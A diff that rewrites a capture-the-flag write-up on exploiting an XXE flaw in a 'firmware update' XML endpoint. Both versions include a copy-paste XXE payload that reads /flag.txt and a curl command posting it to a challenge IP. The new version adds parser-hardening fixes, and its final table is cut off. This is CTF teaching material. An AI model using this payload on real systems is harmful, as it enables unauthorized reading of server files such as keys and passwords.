@@ -1,88 +1,172 @@
-# Jailbreak — Writeup (Beginner-friendly)
+# Jailbreak — Super Beginner-Friendly Writeup
 
-**Challenge name:** Jailbreak  
+**Challenge name:** Jailbreak
 **Points:** 900
 
 ---
 
-## Summary (one-sentence)
-You exploited an **XML External Entity (XXE)** vulnerability in a firmware update endpoint to read the file `/flag.txt` from the challenge server and retrieve the flag.
+## 🧠 What this challenge is about
+
+You are given a fake “firmware update” service that reads XML files. The goal is to find a way to make it **leak the contents of a secret file** called `/flag.txt` on the server.
+
+You can do this using an XML trick called **XXE (XML External Entity)**.
 
 ---
 
-## What the challenge is
-The service accepts an XML firmware update. The XML parser on the server is misconfigured and allows external entities (a feature of XML). By defining an entity that points to a local file and then referencing it inside the XML, the server expands the entity and leaks the file contents back to you.
+## 🧩 What’s happening (in very simple terms)
 
-This is a CTF exercise — do **not** try this on systems you don’t own or have permission to test.
+XML lets you define *entities* — placeholders that can stand for text or files.
+If a server is not careful, an attacker can say:
 
----
+> “Hey XML parser, please read this file and put it right here.”
 
-## Concepts you need to know (short)
-- **XML**: a structured text format (like HTML).  
-- **DOCTYPE / ENTITY**: XML has a feature where you can define shortcuts (entities) in a `<!DOCTYPE>` block.  
-- **XXE (XML External Entity)**: a vulnerability that happens when an XML parser loads external entities, potentially letting an attacker read local files.
+And the server will do it! 😱
 
----
+That’s what we do in this challenge.
 
-## How it works (simple steps)
-1. We send an XML document to the server that includes a `<!DOCTYPE>` declaration.  
-2. Inside the `DOCTYPE` we define an entity (named `xxe`) that tells the parser to read `file:///flag.txt`.  
-3. We reference `&xxe;` inside an element in the XML body (for example inside `<Version>`).  
-4. The server’s XML parser replaces `&xxe;` with the contents of `/flag.txt`.  
-5. If the server returns or shows the parsed XML, the flag becomes visible to us.
+We’ll define an entity that points to the flag file: `file:///flag.txt`.
+Then we’ll insert that entity in the XML, and when the server reads the XML, it will replace it with the flag.
 
 ---
 
-## Payload (exact XML you can reuse)
+## 📘 Quick explanation of terms
+
+| Term        | What it means                                                                    |
+| ----------- | -------------------------------------------------------------------------------- |
+| **XML**     | A structured way to send data, like HTML but for data.                           |
+| **DOCTYPE** | A section at the top of XML that defines custom shortcuts (entities).            |
+| **ENTITY**  | A shortcut that can hold text or a file’s contents.                              |
+| **XXE**     | When a hacker uses an ENTITY to make the server read files or data it shouldn’t. |
+
+---
+
+## 🪄 Step-by-step guide
+
+1. The server has an endpoint `/api/update` that accepts XML input.
+2. We send XML that defines an ENTITY named `xxe`, which points to `/flag.txt`.
+3. We use `&xxe;` inside the XML. The `&xxe;` part gets replaced with whatever is inside `/flag.txt`.
+4. The server then returns the parsed XML — including the flag!
+
+---
+
+## 🧾 The XML payload (copy this)
+
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>
 <FirmwareUpdateConfig>
-    <Firmware>
-        <Version>1.33.7&xxe;</Version>
-        <ReleaseDate>2077-10-21</ReleaseDate>
-        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
-    </Firmware>
+  <Firmware>
+    <Version>1.33.7&xxe;</Version>
+    <ReleaseDate>2077-10-21</ReleaseDate>
+    <Description>Update test</Description>
+  </Firmware>
 </FirmwareUpdateConfig>
 ```
 
-Put that as the POST body to `/api/update` and the application (if vulnerable) will expand `&xxe;` to file contents.
+### 💡 How it works
+
+* The line `<!ENTITY xxe SYSTEM "file:///flag.txt">` tells the parser: “The entity `xxe` means the contents of `/flag.txt`.”
+* The part `&xxe;` means “insert that entity here.”
+* So the parser will replace `&xxe;` with whatever is in `/flag.txt`.
+
+Example:
+
+```xml
+<Version>1.33.7FLAG{super_secret_flag}</Version>
+```
 
 ---
 
-## Example `curl` command (copy-paste)
+## 💻 Example using `curl`
+
+Open your Terminal (on Mac/Linux) or PowerShell (on Windows) and paste this command:
+
 ```bash
 curl -s -X POST 'http://94.237.57.211:57541/api/update' \
   -H 'Content-Type: application/xml' \
-  --data-binary $'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>\n<FirmwareUpdateConfig>\n  <Firmware>\n    <Version>1.33.7&xxe;</Version>\n    <ReleaseDate>2077-10-21</ReleaseDate>\n  </Firmware>\n</FirmwareUpdateConfig>'
+  --data-binary $'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>\n<FirmwareUpdateConfig>\n  <Firmware>\n    <Version>1.33.7&xxe;</Version>\n  </Firmware>\n</FirmwareUpdateConfig>'
 ```
-Run that in Terminal; if the service is vulnerable it will output the server response which will include the expanded contents of `/flag.txt` (the flag).
+
+After pressing **Enter**, look at the output.
+If it worked, you’ll see something like this:
+
+```
+<Response>
+  <Version>1.33.7FLAG{this_is_the_flag}</Version>
+</Response>
+```
+
+🎉 The flag is `FLAG{this_is_the_flag}`!
 
 ---
 
-## What you should see
-Look in the response for a string that looks like a flag (common formats: `FLAG{...}` or `flag{...}` or similar). The exact format depends on the CTF platform.
+## 👀 What you should see
+
+Look for a string that looks like `FLAG{something}`.
+That’s your flag. Copy it and submit it on the CTF site.
+
+If you don’t see anything, make sure:
+
+* You sent to the **right IP and port**.
+* You used **Content-Type: application/xml**.
+* You copied the payload exactly.
 
 ---
 
-## Why this is bad (in plain English)
-The server is trusted to parse XML safely. Because it allowed the XML parser to read files from the local filesystem, an attacker can trick it into showing secrets (like configuration files, keys, or the flag). In real-world systems, that could expose passwords, private keys, or other sensitive data.
+## ⚠️ Why this works (and why it’s dangerous)
+
+* The server’s XML parser is **too trusting**.
+* It allows `DOCTYPE` and `ENTITY` processing.
+* So you can make it read files on the server (like `/flag.txt`).
+
+In the real world, this could leak passwords, config files, or API keys.
 
 ---
 
-## How to fix it (brief)
-- Disable DTD and external entity processing in the XML parser.  
-- If you don’t need DOCTYPE processing, explicitly block DOCTYPE declarations from untrusted input.  
-- Use modern, safe parsing libraries or use JSON where possible.  
-- Run the service with the least privilege so files like `/flag.txt` aren’t accessible.
+## 🔧 How to fix this (for developers)
+
+**Don’t let XML parsers read external entities!**
+
+Examples:
+
+**Python (safe parsing)**
+
+```python
+from defusedxml.ElementTree import fromstring
+xml_data = fromstring(xml_input)  # safe parser, blocks XXE
+```
+
+**Java (disable DTD)**
+
+```java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+```
+
+Or use **JSON** instead of XML when possible.
 
 ---
 
-## Notes and tips for beginners
-- If nothing appears in the response, the server might parse but not display that value — some XXE scenarios require different techniques (blind XXE or out-of-band exfiltration).  
-- Always confirm you are posting to the correct URL and port shown in the challenge.  
-- Keep your README short and show the exact payload and curl command — judges like reproducible steps.
+## 🪶 Quick recap
+
+✅ XML parser reads files if misconfigured
+✅ `<!ENTITY xxe SYSTEM "file:///flag.txt">` defines a file reference
+✅ `&xxe;` inserts the file contents into XML
+✅ Server returns that → you get the flag
 
 ---
 
-## License / Attribution
-Writeup created for a CTF challenge. Do not use on unauthorized systems.
+## 🚫 Legal note
+
+This technique is for **educational and CTF use only**.
+Never test real websites or systems without permission.
+
+---
+
+## ✨ Summary for beginners
+
+| Step | What you do                    | Why it matters                      |
+| ---- | ------------------------------ | ----------------------------------- |
+| 1    | Create XML payload with ENTITY | Tells XML parser to read a file     |
+| 2    | Send to `/api/update` endpoint | The server parses it                |
+| 3    | Parser replaces `&xxe;`        | You get the contents of `/flag.txt` |
+| 4    | Look for `FLAG{                |                                     |
